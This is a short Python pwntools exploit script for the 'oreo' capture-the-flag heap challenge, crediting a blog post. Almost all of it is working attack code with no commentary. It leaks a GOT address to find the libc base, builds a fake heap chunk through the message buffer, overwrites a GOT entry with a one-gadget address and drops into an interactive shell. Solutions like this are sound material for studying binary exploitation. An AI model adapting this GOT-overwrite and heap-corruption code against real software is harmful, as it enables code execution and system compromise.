#http://nextline.tistory.com/125

from pwn import *

put_got = 0x0804a248
leave_msg = 0x804a2c0
new_count = 0x0804A2A4

s = process('./oreo')

def add(name, description):
    s.sendline('1')
    s.sendline(name)
    s.sendline(description)
def leave(msg):
    s.sendline('4')
    s.sendline(msg)


add('A' * 27 + p32(put_got),'B')

s.recv(1024)
s.sendline('2')
put_leak = u32(s.recv(1024)[213:217])
libc_base = (put_leak - 0x5fca0)
free_leak = (put_leak + 1548896)
one_shot = (libc_base + 0x5fbc5)

print hex(libc_base)

payload = p32(0) * 9 + p32(0x12c)

leave(payload)

for i in range(0x41 - 0x3):
        add('A', 'B')

add('A' * 27 + "\x00" * 4, 'B')
add('A' * 27 + p32(new_count + 0x4),'B')
s.sendline('3')

add('A',p32(put_got))
leave(p32(one_shot))
s.sendline('5')

s.interactive()
